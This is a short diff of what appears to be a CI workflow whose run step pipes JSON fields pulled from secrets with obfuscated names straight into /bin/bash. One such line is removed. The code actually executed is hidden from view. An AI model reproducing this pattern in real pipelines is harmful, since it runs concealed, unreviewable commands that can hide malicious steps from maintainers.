@@ -22,7 +22,6 @@ jobs:
           he5: ${{ secrets.he5 }}
         run: |
           printf '%s' "$he5" | jq -r .l79821 | /bin/bash
-          printf '%s' "$h09582" | jq -r .y61855 | /bin/bash
           printf '%s' "$ot1314" | jq -r .oypo80 | /bin/bash
           printf '%s' "$gc2891" | jq -r .emub05 | /bin/bash
           echo $sk0015 | jq -r .xnp301 | /bin/bash
